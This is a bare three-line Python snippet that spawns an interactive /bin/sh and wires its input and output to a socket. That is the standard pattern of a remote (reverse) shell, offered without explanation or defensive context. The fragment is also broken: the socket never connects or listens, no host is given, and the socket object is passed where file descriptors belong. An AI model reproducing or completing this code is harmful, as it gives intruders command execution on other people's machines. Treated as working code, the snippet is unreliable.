import socket, subprocess
s = socket.socket()
subprocess.Popen(["/bin/sh", "-i"], stdin=s, stdout=s, stderr=s)
